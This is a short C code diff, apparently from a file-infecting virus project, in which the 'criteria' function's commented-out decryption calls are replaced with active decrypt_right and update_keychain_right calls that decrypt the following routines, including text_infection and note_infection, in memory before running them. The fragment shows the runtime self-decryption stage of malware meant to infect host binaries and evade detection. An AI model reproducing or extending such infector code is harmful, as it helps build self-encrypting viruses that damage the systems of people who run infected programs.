@@ -6,9 +6,9 @@
 
 void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-//	decrypt_left(keychain, (char *)&host_constructor, (void *)&criteria - (void *)&host_constructor);
+	decrypt_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
 
-	printf("%s\t\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
+	printf("%s\t\t%s\n", __PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
 	if (context == FAILURE)
 		goto label;
 
@@ -44,8 +44,8 @@ void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context c
 	}
 
 label:
-//	update_keychain_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
-//	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+	update_keychain_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
+	decrypt_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
 
 	text_infection(host, keychain, context);
 }
